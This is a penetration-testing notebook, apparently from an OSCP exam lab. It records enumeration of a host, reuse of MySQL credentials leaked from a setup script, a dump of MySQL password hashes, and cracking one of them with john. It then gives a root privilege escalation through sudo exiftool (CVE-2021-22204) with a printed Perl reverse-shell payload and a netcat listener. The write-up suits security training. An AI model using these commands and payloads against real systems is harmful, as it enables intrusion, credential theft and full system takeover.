
Notes:
```
21: vsftpd 3.0.5
- try anonymous login            [X]
- look up version exploits        

22: Probably not a vector

80: Begin Web fuzzing - browse to website - Apache httpd 2.4.52 ((Ubuntu))
-gobuster
- nikto
- dirsearch 
	- if dont find stuff on first wordlists try more

3306: MySQL 5.7.38 version - sql injection of some sort.
- lookup default credentials
- try to connect using mysql.py

8080: Begin Web fuzzing - browse to website - Apache httpd 2.4.52 ((Ubuntu))
-gobuster
- nikto
- dirsearch 
	- if dont find stuff on first wordlists try more

```

FTP 21 Enum:

#anonymous #login
```
# failed anonymous login
┌──(root㉿kali)-[/home/kali]
└─# ftp 192.168.118.110
Connected to 192.168.118.110.
220 (vsFTPd 3.0.5)
Name (192.168.118.110:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

Port 80 Enum:

Browsing to website shows:
#gobuster #common
```shell
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.118.110 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx

proxychains gobuster dir -u http://172.16.2.12 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.118.110
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/04/12 09:43:17 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.hta.asp             (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.hta.txt             (Status: 403) [Size: 280]
/.hta.aspx            (Status: 403) [Size: 280]
/.htaccess.php        (Status: 403) [Size: 280]
/.hta.php             (Status: 403) [Size: 280]
/.htaccess.txt        (Status: 403) [Size: 280]
/.hta.html            (Status: 403) [Size: 280]
/.htaccess.html       (Status: 403) [Size: 280]
/.htaccess.asp        (Status: 403) [Size: 280]
/.htaccess.aspx       (Status: 403) [Size: 280]
/.htpasswd.txt        (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.htpasswd.aspx       (Status: 403) [Size: 280]
/.htpasswd.html       (Status: 403) [Size: 280]
/.htpasswd.php        (Status: 403) [Size: 280]
/.htpasswd.asp        (Status: 403) [Size: 280]
/About.html           (Status: 200) [Size: 5021]
/blog                 (Status: 301) [Size: 317] [--> http://192.168.118.110/blog/]                                                                              /Contact.html         (Status: 200) [Size: 5027]
/Home.html            (Status: 200) [Size: 68723]
/images               (Status: 301) [Size: 319] [--> http://192.168.118.110/images/]
/index.html           (Status: 200) [Size: 68778]
/index.html           (Status: 200) [Size: 68778]
/scripts              (Status: 301) [Size: 320] [--> http://192.168.118.110/scripts/]
/server-status        (Status: 403) [Size: 280]
Progress: 27654 / 27690 (99.87%)
===============================================================
2023/04/12 09:45:38 Finished
===============================================================

# /scripts, has .sh files in it

```

#dirsearch #medium 
```shell
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://192.168.118.110:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```


Port 8080 Enum:
#gobuster #common
```shell
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.118.110:8080 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.118.110
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/04/12 09:43:17 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.hta.asp             (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.hta.txt             (Status: 403) [Size: 280]
/.hta.aspx            (Status: 403) [Size: 280]
/.htaccess.php        (Status: 403) [Size: 280]
/.hta.php             (Status: 403) [Size: 280]
/.htaccess.txt        (Status: 403) [Size: 280]
/.hta.html            (Status: 403) [Size: 280]
/.htaccess.html       (Status: 403) [Size: 280]
/.htaccess.asp        (Status: 403) [Size: 280]
/.htaccess.aspx       (Status: 403) [Size: 280]
/.htpasswd.txt        (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.htpasswd.aspx       (Status: 403) [Size: 280]
/.htpasswd.html       (Status: 403) [Size: 280]
/.htpasswd.php        (Status: 403) [Size: 280]
/.htpasswd.asp        (Status: 403) [Size: 280]
/About.html           (Status: 200) [Size: 5021]
/blog                 (Status: 301) [Size: 317] [--> http://192.168.118.110/blog/]                                                                              /Contact.html         (Status: 200) [Size: 5027]
/Home.html            (Status: 200) [Size: 68723]
/images               (Status: 301) [Size: 319] [--> http://192.168.118.110/images/]
/index.html           (Status: 200) [Size: 68778]
/index.html           (Status: 200) [Size: 68778]
/scripts              (Status: 301) [Size: 320] [--> http://192.168.118.110/scripts/]
/server-status        (Status: 403) [Size: 280]
Progress: 27654 / 27690 (99.87%)
===============================================================
2023/04/12 09:45:38 Finished
===============================================================

# /scripts, has .sh files in it

```

Scripts Folder:
![[Penetration Testing v2/oscp pass 20230412/1. 192.168.118.110 - done - extra screenshots in here/screenshots/scripts folder.png]]
#dirsearch #medium 

```shell
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://192.168.118.110:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

- wiki_setup.sh has credentials in it probably for sql considering mysql is running
![[wiki_setup.sh.png]]
```shell
# lookup mysql commands to login
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cat wiki_setup.sh    
# mysql
DBUSER='chanel'			# SQL user to do the work
DBPASS='Shinji6510'		# Password for the SQL user
HOSTNAME='oscp.exam'		# Name of the SQL database host
WIKIDB='wdbA'			# When making backups, export this database name
WIKIUSER='wiki-admin1'		# Name of the wiki db user specified in LocalSettings.php
WIKIPASS='P@ssw0rd@2'		# Wiki db user password
```

![[mysql connection.png]]
![[mysql p3.png]]
- on mysql server
```shell
┌──(root㉿kali)-[/home/kali/Downloads]
└─# mysql --host=192.168.118.110 --port=3306 --user=chanel -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 5.7.38 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 

```

- Ran SHOW GRANTS; to see what privileges chanel has, chanel is able to grab everything.

Going to try a select * to get everything
```shell
#showing databases to connect to 

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

```

![[mySQL server Data bases.png]]

![[sql show tables.png]]
- showing tables, user sticks out so going to try to grab from there
```shell

MySQL [mysql]> SHOW TABLES;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| engine_cost               |
| event                     |
| func                      |
| general_log               |
| gtid_executed             |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| innodb_index_stats        |
| innodb_table_stats        |
| ndb_binlog_index          |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| server_cost               |
| servers                   |
| slave_master_info         |
| slave_relay_log_info      |
| slave_worker_info         |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+

```


- mysql native passwords
```shell
MySQL [mysql]> SELECT * FROM user;
+-----------+---------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
| Host      | User          | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                     | password_expired | password_last_changed | password_lifetime | account_locked |
+-----------+---------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
| localhost | root          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *0880FD3A9C8D2BB55A2C5C0BE9E0578EB55022B2 | N                | 2022-06-22 09:47:01   |              NULL | N              |
| localhost | mysql.session | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | Y          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2022-06-22 09:46:58   |              NULL | Y              |
| localhost | mysql.sys     | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2022-06-22 09:46:58   |              NULL | Y              |
| localhost | chanel        | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *407F8D35DAF8B6F7BC30BB665564CC36E8EA6FB3 | N                | 2022-06-22 09:47:17   |              NULL | N              |
| %         | chanel        | Y           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *407F8D35DAF8B6F7BC30BB665564CC36E8EA6FB3 | N                | 2022-06-22 09:47:17   |              NULL | N              |
| localhost | cristine      | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *B12F09D11BB3852F8FA53FC7F017893DF01E3B82 | N                | 2022-06-22 09:47:17   |              NULL | N              |
| localhost | bob           | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *32520D64EA7094863697EC1BD3BE5FDC1496A1FF | N                | 2022-06-22 09:47:17   |              NULL | N              |
| localhost | shaun         | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *DC4EA813DD21ACDBC05CB657D64E410062FF561A | N                | 2022-06-22 09:47:17   |              NULL | N              |
+-----------+---------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+

```



![[Penetration Testing v2/oscp pass 20230412/1. 192.168.118.110 - done - extra screenshots in here/screenshots/Got usernames and passwords from user files.png]]

- threw hashes into hash analyzer and found that the hashes were sha 1, going to attempt to break with hashcat


![[hash analyzer.png]]
# hashcat didnt work
```shell
root:
	*0880FD3A9C8D2BB55A2C5C0BE9E0578EB55022B2
chanel:
	*407F8D35DAF8B6F7BC30BB665564CC36E8EA6FB3
cristine:
	*B12F09D11BB3852F8FA53FC7F017893DF01E3B82
bob:
	*32520D64EA7094863697EC1BD3BE5FDC1496A1FF
shaun
*DC4EA813DD21ACDBC05CB657D64E410062FF561A
```

- going to try john - this didnt work as a default, need to supply with a wordlist
```shell

$ cat hashes.txt
*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
$ john hashes.txt
$ john --format=mysql-sha1 hashes.txt
```


- put all hashes in individual files to crack
```shell
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.110]
└─# echo -n "*0880FD3A9C8D2BB55A2C5C0BE9E0578EB55022B2" > roothash.txt                                            

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.110]
└─# ls
roothash.txt

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.110]
└─# echo -n "*407F8D35DAF8B6F7BC30BB665564CC36E8EA6FB3" > chanelhash.txt

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.110]
└─# ls
chanelhash.txt  roothash.txt

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.110]
└─# echo -n "*B12F09D11BB3852F8FA53FC7F017893DF01E3B82" > cristinehash.txt

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.110]
└─# ls
chanelhash.txt  cristinehash.txt  roothash.txt

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.110]
└─# echo -n "*32520D64EA7094863697EC1BD3BE5FDC1496A1FF" > bobhash.txt

┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.110]
└─# echo -n "*DC4EA813DD21ACDBC05CB657D64E410062FF561A" > shaunhash.txt
  
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.110]
└─# ls
bobhash.txt  chanelhash.txt  cristinehash.txt  roothash.txt  shaunhash.txt
      
```


![[Penetration Testing v2/oscp pass 20230412/1. 192.168.118.110 - done - extra screenshots in here/screenshots/all hashes serparated.png]]


- went through list of hashes and was able to crack cristine
```shell
# cristine cracked hash
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.110]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt cristinehash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
2ql4sql          (?)     
1g 0:00:00:00 DONE (2023-04-13 03:01) 10.00g/s 10912Kp/s 10912Kc/s 10912KC/s 2qwertyui..2ql4sql
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

![[cracked cristine hash.png]]

- need to look back at what ports are open to see where the hash could be used

- going to try ssh first
	- ftp next try - maybe upload a rev shell and navigate to it through the web


![[cristine ssh.png]]

- Was able to ssh with cristine credentials
- 
```shell
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.110]
└─# ssh cristine@192.168.118.110
The authenticity of host '192.168.118.110 (192.168.118.110)' can't be established.
ED25519 key fingerprint is SHA256:1p23u4Gg+sEr8N3gHR0SMiI3Hbp4ucjQXF1Kf1Adjik.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.118.110' (ED25519) to the list of known hosts.
cristine@192.168.118.110's password: 
cristine@oscp:~$ whoami
cristine
cristine@oscp:~$ 

```

- beginning checks

```shell
# no new ports to navigate to
cristine@oscp:~$ ss -ant
State                    Recv-Q                   Send-Q                                                  Local Address:Port                                                  Peer Address:Port                    Process                   
LISTEN                   0                        4096                                                    127.0.0.53%lo:53                                                         0.0.0.0:*                                                 
LISTEN                   0                        128                                                           0.0.0.0:22                                                         0.0.0.0:*                                                 
ESTAB                    0                        52                                                    192.168.118.110:22                                                  192.168.49.118:42342                                             
LISTEN                   0                        80                                                                  *:3306                                                             *:*                                                 
LISTEN                   0                        511                                                                 *:8080                                                             *:*                                                 
LISTEN                   0                        511                                                                 *:80                                                               *:*                                                 
LISTEN                   0                        32                                                                  *:21                                                               *:*                                                 
LISTEN                   0                        128                                                              [::]:22                                                            [::]:*                                                 
ESTAB                    0                        0                                            [::ffff:192.168.118.110]:3306                                       [::ffff:192.168.49.118]:46428        
```

- ifconfig does not work, ip a does
```shell
cristine@oscp:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:bc:90 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    inet 192.168.118.110/24 brd 192.168.118.255 scope global ens160
       valid_lft forever preferred_lft forever
cristine@oscp:~$ 

```

- sudo -l shows with use of password
![[sudo -l.png]]
```shell
# commands that can be run as root, going to check gtfobins

cristine@oscp:~$ sudo -l
[sudo] password for cristine: 
Matching Defaults entries for cristine on oscp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User cristine may run the following commands on oscp:
    (root) /usr/bin/calendar
    (root) /usr/bin/mcheck
    (root) /usr/local/bin/exiftool
    (root) /usr/bin/rdma
cristine@oscp:~$ 

```

- going to finish looking at rdma and searchsploit these
![[gtfobins exiftool.png]]


```shell
#calendar doesn't actually exist
cristine@oscp:/usr/bin$ ls | grep calendar
cristine@oscp:/usr/bin$ 

#mcheck doesn't exist either
cristine@oscp:/usr/bin$ ls | grep mcheck  

#exiftool actually exists
cristine@oscp:/usr/local/bin$ ls -la
total 308
drwxr-xr-x  2 root root   4096 Jun 22  2022 .
drwxr-xr-x 10 root root   4096 Apr 21  2022 ..
-r-xr-xr-x  1 root root 307194 Jun 22  2022 exiftool
cristine@oscp:/usr/local/bin$ 

# rdma actually exists too!
cristine@oscp:/usr/bin$ ls -la | grep rdma
-rwxr-xr-x  1 root root      100880 Mar 24  2022 rdma
cristine@oscp:/usr/bin$ 

# going to searchsploit both of these to see what I am able to find
```


![[exiftool.png]]


![[rdma screenshot.png]]

- Searchsploit ExifTool 

![[searchsploit Exiftool.png]]

```shell
#exploit matches versions to the searchsploit 50911.py - 12.23
```

![[Penetration Testing v2/oscp pass 20230412/1. 192.168.118.110 - done - extra screenshots in here/screenshots/50911.py.png]]

- checking version of exiftool

```shell
cristine@oscp:/usr/bin$ exiftool -ver
12.23
cristine@oscp:/usr/bin$   
```

![[exiftool version.png]]


- checking python3 syntax

```shell
- looks like it can use a revshell
┌──(root㉿kali)-[/home/kali/Documents/12apr_exam/192.168.118.110]
└─# python3 50911.py                       
UNICORD Exploit for CVE-2021-22204

Usage:
  python3 exploit-CVE-2021-22204.py -c <command>
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>
  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -h

Options:
  -c    Custom command mode. Provide command to execute.
  -s    Reverse shell mode. Provide local IP and port.
  -i    Path to custom JPEG image. (Optional)
  -h    Show this help menu.
```



- transferring file to victim machine
![[transferred 50911.py exploit to tmp folder.png]]

```shell
cristine@oscp:/tmp$ wget http://192.168.49.118:1337/50911.py
--2023-04-13 07:32:36--  http://192.168.49.118:1337/50911.py
Connecting to 192.168.49.118:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4740 (4.6K) [text/x-python]
Saving to: '50911.py'

50911.py                                                    100%[========================================================================================================================================>]   4.63K  --.-KB/s    in 0s      

2023-04-13 07:32:36 (12.5 MB/s) - '50911.py' saved [4740/4740]

cristine@oscp:/tmp$ ls
50911.py                                                                      systemd-private-4f7544b8f0c6416688ea5454eca62eef-systemd-logind.service-ECp12d
snap.lxd                                                                      systemd-private-4f7544b8f0c6416688ea5454eca62eef-systemd-resolved.service-erqTIO
systemd-private-4f7544b8f0c6416688ea5454eca62eef-ModemManager.service-eoAYVr  systemd-private-4f7544b8f0c6416688ea5454eca62eef-systemd-timesyncd.service-Oib4sJ
systemd-private-4f7544b8f0c6416688ea5454eca62eef-apache2.service-IOrNoF       vmware-root_719-4290035592
cristine@oscp:/tmp$ 


```
- Throwing exploit

```shell
python3 50911.py -s 192.168.49.118 1234
```

- setup nc listener

```shell
# ran the exploit 
cristine@oscp:/tmp$ python3 50911.py -s 192.168.49.118 1234

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
RUNNING: UNICORD Exploit for CVE-2021-22204
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(1234,inet_aton('192.168.49.118')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
RUNTIME: DONE - Exploit image written to 'image.jpg'

# the exploit puts a reverse shell into image.jpg

# ran exploit as sudo
cristine@oscp:/tmp$ sudo -l /usr/local/bin/exiftool image.jpg
/usr/local/bin/exiftool image.jpg
cristine@oscp:/tmp$ sudo root /usr/local/bin/exiftool image.jpg
sudo: root: command not found
cristine@oscp:/tmp$ sudo  /usr/local/bin/exiftool image.jpg
```

- exploit puts reverse shell into image.jpg
![[CVE 2021 22204 thrown.png]]

- setup nc listener as well as run exiftool against image.jpg with sudo privileges


![[Penetration Testing v2/oscp pass 20230412/1. 192.168.118.110 - done - extra screenshots in here/screenshots/on as root.png]]


nc -lvnp 1234

```shell

┌──(root㉿kali)-[/home/kali/Downloads]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.49.118] from (UNKNOWN) [192.168.118.110] 56942
# whoami
root

```

Local.txt
```shell

# ls
local.txt
# cat local.txt
1f0ac214ce4ac94f27737be8980f7831
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:bc:90 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    inet 192.168.118.110/24 brd 192.168.118.255 scope global ens160
       valid_lft forever preferred_lft forever
# 
```


![[local.txt and ip a.png]]

proof.txt

```shell

# cd /root
# ls
proof.txt
snap
# cat proof.txt
f55cc04e3cb43d6ba8cc05021fe6cde3
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:bc:90 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    inet 192.168.118.110/24 brd 192.168.118.255 scope global ens160
       valid_lft forever preferred_lft forever
# 

```



![[proof.txt and ip a.png]]